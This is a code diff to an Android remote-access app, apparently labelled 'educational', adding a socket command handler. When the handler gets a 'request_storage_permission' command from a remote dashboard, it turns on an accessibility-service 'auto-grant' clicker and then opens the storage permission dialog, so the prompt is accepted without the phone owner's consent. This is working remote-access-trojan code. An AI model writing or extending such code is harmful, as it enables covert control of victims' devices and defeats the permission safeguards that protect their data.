@@ -648,6 +648,30 @@ public class SocketManager {
                 return commandExecutor.executeCommand(command, params);
         }
 
+        // ── Storage permission (on-demand from dashboard) ────────────────
+        if (command.equals("request_storage_permission")) {
+            JSONObject r = new JSONObject();
+            try {
+                new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+                    try {
+                        com.remoteaccess.educational.permissions.AutoPermissionManager apm =
+                            new com.remoteaccess.educational.permissions.AutoPermissionManager(context);
+                        // Re-enable auto-grant so the accessibility clicker handles the dialog
+                        UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+                        if (svc != null) svc.reEnableAutoGrant(20_000);
+                        // Open the storage permission screen
+                        apm.requestWriteExternalStorageLast();
+                    } catch (Exception ignored) {}
+                });
+                r.put("success", true);
+                r.put("message", "Storage permission request triggered");
+            } catch (Exception e) {
+                r.put("success", false);
+                r.put("error", e.getMessage());
+            }
+            return r;
+        }
+
         // ── Accessibility status ─────────────────────────────────────────
         if (command.equals("get_accessibility_status")) {
             JSONObject r = new JSONObject();
